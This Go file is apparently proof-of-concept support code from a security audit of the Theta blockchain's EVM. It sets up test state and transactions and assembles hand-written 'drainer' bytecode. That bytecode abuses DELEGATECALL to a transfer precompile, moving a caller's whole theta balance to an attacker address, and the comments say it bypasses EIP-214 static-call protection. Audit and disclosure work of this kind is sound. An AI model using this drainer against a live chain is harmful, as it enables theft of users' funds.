package vm

// Audit harness (PoC support code). Runs against the *unmodified* production
// EVM code in this package. Nothing here changes consensus behaviour; these are
// tests only.

import (
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/ledger/state"
	"github.com/thetatoken/theta/ledger/types"
	"github.com/thetatoken/theta/store/database/backend"
)

const auditHeight = uint64(19000000) // mainnet is far past every feature gate

// addrs used across the PoCs
var (
	victimEOA   = common.HexToAddress("0x1111111111111111111111111111111111111111")
	attackerEOA = common.HexToAddress("0x2222222222222222222222222222222222222222")
	attackerCtr = common.HexToAddress("0x3333333333333333333333333333333333333333")
	victimCtr   = common.HexToAddress("0x4444444444444444444444444444444444444444")
	helperCtr   = common.HexToAddress("0x5555555555555555555555555555555555555555")
)

func newAuditView(t *testing.T) *state.StoreView {
	t.Helper()
	sv := state.NewStoreView(auditHeight, common.Hash{}, backend.NewMemDatabase())
	if sv == nil {
		t.Fatal("failed to create store view")
	}
	return sv
}

// thetaN / tfuelN build N-token amounts in wei (1 token = 1e18 wei).
func thetaN(n int64) *big.Int  { return new(big.Int).Mul(big.NewInt(n), big.NewInt(1e18)) }
func tfuelN(n int64) *big.Int  { return thetaN(n) }

func setBalance(t *testing.T, sv *state.StoreView, addr common.Address, theta, tfuel *big.Int) {
	t.Helper()
	acc := sv.GetOrCreateAccount(addr)
	if theta == nil {
		theta = big.NewInt(0)
	}
	if tfuel == nil {
		tfuel = big.NewInt(0)
	}
	acc.Balance = types.Coins{ThetaWei: new(big.Int).Set(theta), TFuelWei: new(big.Int).Set(tfuel)}
	sv.SetAccount(addr, acc)
}

func setCode(t *testing.T, sv *state.StoreView, addr common.Address, codeHex string) {
	t.Helper()
	code, err := hex.DecodeString(codeHex)
	if err != nil {
		t.Fatalf("bad hex: %v", err)
	}
	// ensure the account exists before attaching code
	acc := sv.GetOrCreateAccount(addr)
	sv.SetAccount(addr, acc)
	sv.SetCode(addr, code)
}

func thetaOf(sv *state.StoreView, addr common.Address) *big.Int {
	return sv.GetThetaBalance(addr)
}

func tfuelOf(sv *state.StoreView, addr common.Address) *big.Int {
	return sv.GetBalance(addr)
}

func runTx(t *testing.T, sv *state.StoreView, from, to common.Address, data []byte, gasLimit uint64, thetaValue, tfuelValue *big.Int) (common.Bytes, error) {
	t.Helper()
	tx := &types.SmartContractTx{
		From: types.TxInput{
			Address:  from,
			Coins:    types.Coins{ThetaWei: thetaValue, TFuelWei: tfuelValue},
			Sequence: 1,
		},
		To:       types.TxOutput{Address: to},
		Data:     data,
		GasLimit: gasLimit,
		GasPrice: big.NewInt(4e12),
	}
	blockInfo := NewBlockInfo(auditHeight, big.NewInt(1), "mainnet")
	ret, _, _, err := Execute(blockInfo, tx, sv)
	return ret, err
}

// ---------------------------------------------------------------------------
// bytecode building blocks (theta stack order honoured: last pushed = first popped)
// ---------------------------------------------------------------------------

const (
	mul96 = "6c01000000000000000000000000" // PUSH13 2^96
)

func push20(a common.Address) string { return "73" + hex.EncodeToString(a.Bytes()) }

// drainerRuntime builds a runtime that, when executed in a frame whose
// CallerAddress is <debit>, moves the *entire* theta balance of <debit> to
// <credit> and returns.
//
// layout of transferTheta (0xCB) input: [0:20] = recipient, [20:52] = amount
//
//	33 <mul96> 02 6000 52                  mem[0:20] = CALLER          (debit identity)
//	6020 6040 6014 6000 60c9 61ffff fa     STATICCALL 0xC9 -> mem[64:96]=thetawei(CALLER)
//	73<credit> <mul96> 02 6000 52          mem[0:20] = credit
//	6040 51 6014 52                        mem[20:52] = amount
//	6000 6000 6034 6000 60cb 61ffff f4     DELEGATECALL 0xCB (debts CallerAddress!)
func drainerRuntime(credit common.Address) string {
	return "33" + mul96 + "02" + "6000" + "52" +
		"6020" + "6040" + "6014" + "6000" + "60c9" + "61ffff" + "fa" +
		push20(credit) + mul96 + "02" + "6000" + "52" +
		"6040" + "51" + "6014" + "52" +
		"6000" + "6000" + "6034" + "6000" + "60cb" + "61ffff" + "f4" +
		"00"
}

// staticDrainerRuntime is drainerRuntime but it is reached through a STATICCALL
// (read-only) context, proving the EIP-214 bypass.
func staticDrainerRuntime(credit common.Address) string { return drainerRuntime(credit) }

// smartTx builds a SmartContractTx without executing it (for gas measurements).
func smartTx(from, to common.Address, data []byte, gasLimit uint64) *types.SmartContractTx {
	return &types.SmartContractTx{
		From:     types.TxInput{Address: from, Coins: types.NewCoins(0, 0), Sequence: 1},
		To:       types.TxOutput{Address: to},
		Data:     data,
		GasLimit: gasLimit,
		GasPrice: big.NewInt(4e12),
	}
}
